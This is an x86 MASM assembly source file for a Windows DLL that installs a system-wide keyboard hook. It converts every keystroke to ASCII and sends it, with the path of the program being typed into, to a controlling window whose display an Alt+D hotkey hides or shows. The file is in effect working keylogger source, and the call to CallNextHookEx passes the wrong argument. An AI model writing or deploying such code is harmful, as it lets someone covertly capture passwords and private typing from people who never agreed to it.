
	.386
	.model flat, stdcall
	option casemap :none
;-------------------------------------------------------------------------------------------------------
; Include 文件定义
include		windows.inc
include		user32.inc
includelib	user32.lib
include		kernel32.inc
includelib	kernel32.lib
;--------------------------------------------------------------------------------------------------------
;equ定义
IDM_HIDE    equ    2001h
;-------------------------------------------------------------------------------------------------------
;数据段
	.data
hInstance    dd    ?

	.data?
hWnd         dd    ?
hHook        dd    ?
dwMessage    dd    ?
szAscii      db    4 dup (?)
current_app_name  db    200 DUP (?)
;-------------------------------------------------------------------------------------------------------
;代码段
	.code
; dll 的入口函数
DllEntry  proc  _hInstance,_dwReason,_dwReserved
	push _hInstance
	pop  hInstance
	mov  eax,TRUE
	ret
DllEntry  endp
;dll 的回调函数
HookProc  proc  dwCode,wParam,lParam
	local  @szKeyState[256]:byte
	.if (dwCode == HC_ACTION) && (wParam != 0) ;确保按键被按下防止多次获取按键ascii值
		invoke  GetKeyboardState,addr @szKeyState;获取键盘状态至缓冲区
		invoke  GetKeyState,VK_SHIFT
		mov  @szKeyState + VK_SHIFT,al
		mov  ecx,lParam
		shr  ecx,16
		invoke  ToAscii,wParam,ecx,addr @szKeyState,addr szAscii,0;转换为ascii码
		.if eax!=0 ;转换成功,缓冲区非空，则发送ascii码
			mov byte ptr szAscii [eax],0
			invoke GetModuleHandle,NULL
			invoke GetModuleFileName, eax , addr current_app_name, 200 ;获取当前正在进行输入的程序的全路径
			invoke  SendMessage,hWnd,dwMessage,dword ptr szAscii,eax;发送ascii码
			mov ecx,lParam
			shr ecx,29
			.if (ecx&1)&&(wParam==44h);当按下alt+d时发送消息，切换显示/隐藏状态
				invoke  SendMessage,hWnd,WM_COMMAND,IDM_HIDE,NULL
			.endif
			xor eax,eax
		.endif
	.endif
	invoke	CallNextHookEx,hHook,dwCode,dwCode,lParam
	ret
HookProc	endp
; 钩子安装函数
InstallHook  proc  _hWnd,_dwMessage
	push  _hWnd
	pop   hWnd
	push  _dwMessage
	pop  dwMessage
	invoke   SetWindowsHookEx,WH_KEYBOARD,addr HookProc,hInstance,NULL;安装全局键盘钩子
	mov  hHook,eax
	.if eax!=NULL
		mov eax,offset current_app_name
	.endif
	ret
InstallHook  endp
; 钩子卸载函数
UninstallHook  proc
	invoke  UnhookWindowsHookEx,hHook
	ret
UninstallHook  endp
end	DllEntry

